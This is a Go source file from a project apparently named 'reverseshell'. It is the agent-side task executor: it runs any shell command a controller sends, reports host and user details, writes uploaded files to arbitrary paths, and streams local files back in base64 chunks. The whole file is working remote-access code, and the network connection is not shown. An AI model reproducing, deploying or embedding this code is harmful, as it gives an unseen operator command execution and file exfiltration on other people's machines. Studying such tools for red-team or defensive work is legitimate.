package agent

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"time"

	"reverseshell/internal/protocol"
)

var startedAt = time.Now()

// ExecuteTask decodes nothing by itself: it runs a validated task spec to
// completion and returns its result (README §4.5).
func ExecuteTask(ctx context.Context, spec protocol.TaskSpec, info protocol.AgentInfo) protocol.TaskResult {
	start := time.Now()
	var res protocol.TaskResult
	switch spec.Kind {
	case protocol.KindShell:
		res = runShell(ctx, spec)
	case protocol.KindSysinfo:
		res = sysinfo(info)
	case protocol.KindExit:
		res = protocol.TaskResult{Status: protocol.StatusOK, Detail: "agent exiting"}
	case protocol.KindUpload:
		res = runUpload(spec)
	default:
		res = protocol.TaskResult{
			Status: protocol.StatusUnsupported,
			Detail: fmt.Sprintf("kind %q not supported", spec.Kind),
		}
	}
	res.DurationMS = time.Since(start).Milliseconds()
	return res
}

func runShell(ctx context.Context, spec protocol.TaskSpec) protocol.TaskResult {
	var args protocol.ShellArgs
	if len(spec.Args) > 0 {
		if err := json.Unmarshal(spec.Args, &args); err != nil {
			return protocol.TaskResult{Status: protocol.StatusError, Detail: "bad shell args: " + err.Error()}
		}
	}
	if args.Cmd == "" {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "shell task requires args.cmd"}
	}
	timeout := spec.Timeout
	if timeout <= 0 {
		timeout = 30
	}
	cctx, cancel := context.WithTimeout(ctx, time.Duration(timeout*float64(time.Second)))
	defer cancel()

	// Wrap the system shell: cmd /C on Windows, /bin/sh -c on Unix.
	cmd := exec.CommandContext(cctx, shell(), shellFlag(), args.Cmd)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()

	res := protocol.TaskResult{Stdout: stdout.String(), Stderr: stderr.String()}
	switch {
	case cctx.Err() == context.DeadlineExceeded:
		res.Status = protocol.StatusTimeout
		res.Detail = fmt.Sprintf("command exceeded %.0fs", timeout)
	case cctx.Err() != nil:
		res.Status = protocol.StatusError
		res.Detail = "task cancelled"
	case cmd.ProcessState == nil:
		// The command never started (launch failure).
		res.Status = protocol.StatusError
		res.Detail = fmt.Sprintf("launch: %v", err)
	default:
		// The command ran to completion; a non-zero exit code is data
		// about the command, not a protocol error.
		res.Status = protocol.StatusOK
		res.ExitCode = cmd.ProcessState.ExitCode()
	}
	return res
}

func shell() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	return "/bin/sh"
}

func shellFlag() string {
	if runtime.GOOS == "windows" {
		return "/C"
	}
	return "-c"
}

func sysinfo(info protocol.AgentInfo) protocol.TaskResult {
	snap := map[string]any{
		"hostname":       info.Hostname,
		"os":             info.OS,
		"os_version":     info.OSVersion,
		"arch":           info.Arch,
		"user":           info.User,
		"pid":            info.PID,
		"agent_version":  info.ClientVersion,
		"uptime_seconds": int(time.Since(startedAt).Seconds()),
	}
	b, err := json.Marshal(snap)
	if err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: err.Error()}
	}
	return protocol.TaskResult{Status: protocol.StatusOK, Stdout: string(b)}
}

// runUpload stores one offset-addressed chunk; the final chunk verifies the
// complete-file sha256 before renaming into place (README §4.5).
func runUpload(spec protocol.TaskSpec) protocol.TaskResult {
	var args protocol.UploadArgs
	if err := json.Unmarshal(spec.Args, &args); err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "bad upload args: " + err.Error()}
	}
	if args.Path == "" {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "upload requires a path"}
	}
	data, err := base64.StdEncoding.DecodeString(args.Data)
	if err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "bad chunk encoding"}
	}
	// Chunks are offset-addressed; a partial file collects beside the target
	// until the final chunk verifies it. Concurrent uploads to the same path
	// would collide — sequential tasks per session make that unlikely.
	tmp := args.Path + ".rs-upload"
	f, err := os.OpenFile(tmp, os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "open temp: " + err.Error()}
	}
	if _, err := f.WriteAt(data, args.Offset); err != nil {
		_ = f.Close()
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "write chunk: " + err.Error()}
	}
	_ = f.Close()

	if !args.Final {
		return protocol.TaskResult{
			Status: protocol.StatusOK,
			Detail: fmt.Sprintf("chunk %d/%d stored", args.Index+1, args.Total),
		}
	}
	sum, err := fileSHA256(tmp)
	if err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "hash temp: " + err.Error()}
	}
	if sum != args.SHA256 {
		_ = os.Remove(tmp)
		return protocol.TaskResult{
			Status: protocol.StatusError,
			Detail: fmt.Sprintf("checksum mismatch: assembled %s, want %s", sum, args.SHA256),
		}
	}
	if err := os.Rename(tmp, args.Path); err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "rename into place: " + err.Error()}
	}
	return protocol.TaskResult{
		Status: protocol.StatusOK,
		Detail: fmt.Sprintf("written %d bytes, sha256 verified", args.TotalBytes),
	}
}

// downloadResults streams one download task as chunked RESULTs; the final
// chunk carries the complete-file sha256 (README §4.5).
func downloadResults(spec protocol.TaskSpec) []protocol.TaskResult {
	var args protocol.DownloadArgs
	if err := json.Unmarshal(spec.Args, &args); err != nil || args.Path == "" {
		return []protocol.TaskResult{{Status: protocol.StatusError, Detail: "download requires args.path"}}
	}
	st, err := os.Stat(args.Path)
	if err != nil {
		return []protocol.TaskResult{{Status: protocol.StatusError, Detail: "stat: " + err.Error()}}
	}
	if st.IsDir() {
		return []protocol.TaskResult{{Status: protocol.StatusError, Detail: "path is a directory"}}
	}
	if st.Size() > protocol.MaxTransferBytes {
		return []protocol.TaskResult{{
			Status: protocol.StatusError,
			Detail: fmt.Sprintf("file exceeds the %d MiB cap", protocol.MaxTransferBytes>>20),
		}}
	}
	f, err := os.Open(args.Path)
	if err != nil {
		return []protocol.TaskResult{{Status: protocol.StatusError, Detail: "open: " + err.Error()}}
	}
	defer f.Close()

	h := sha256.New()
	var results []protocol.TaskResult
	buf := make([]byte, protocol.TransferChunkBytes)
	for {
		n, rerr := io.ReadFull(f, buf)
		if n > 0 {
			_, _ = h.Write(buf[:n])
			results = append(results, protocol.TaskResult{
				Status: protocol.StatusOK,
				Data:   base64.StdEncoding.EncodeToString(buf[:n]),
				Chunk:  &protocol.ChunkMeta{Index: len(results)},
				Detail: fmt.Sprintf("chunk %d", len(results)),
			})
		}
		if rerr == io.EOF || rerr == io.ErrUnexpectedEOF {
			break
		}
		if rerr != nil {
			return []protocol.TaskResult{{Status: protocol.StatusError, Detail: "read: " + rerr.Error()}}
		}
	}
	if len(results) == 0 {
		// Empty file: a single final chunk with the empty-file hash.
		results = append(results, protocol.TaskResult{
			Status: protocol.StatusOK,
			Chunk:  &protocol.ChunkMeta{Index: 0, Total: 1},
			Detail: "empty file",
		})
	}
	sum := hex.EncodeToString(h.Sum(nil))
	total := len(results)
	for _, r := range results {
		r.Chunk.Total = total
		r.Chunk.Final = r.Chunk.Index == total-1
		if r.Chunk.Final {
			r.Chunk.SHA256 = sum
		}
	}
	return results
}

func fileSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}
